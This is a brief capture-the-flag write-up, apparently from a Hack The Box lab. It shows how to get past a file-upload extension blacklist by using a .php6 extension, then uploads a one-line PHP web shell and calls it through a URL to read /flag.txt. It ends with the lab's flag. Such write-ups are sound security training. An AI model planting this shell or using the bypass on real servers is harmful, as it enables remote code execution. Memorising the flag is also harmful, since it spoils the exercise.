## Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read “/flag.txt”
> php echo “Hi MWG”; 
- With this payload we will fuzz the file extensions to see if the page displays the text
- After fuzzing where we uncheck the url encoding with the "." character (we don't need it), I discover that only the most popular extensions are blocked, such as php or php4
- I noticed that the .php6 extension is not blocked by the web application, so I use that one with the final payload, file name is "hellp.php6"
> php system($_REQUEST['cmd']);
- File successfully uploaded
- //IP:PORT/profile_images/hellp.php6?cmd=cat%20/flag.txt
- and got a flag ;)
- HTB{1_CENSORED_bl4ckl1573d}
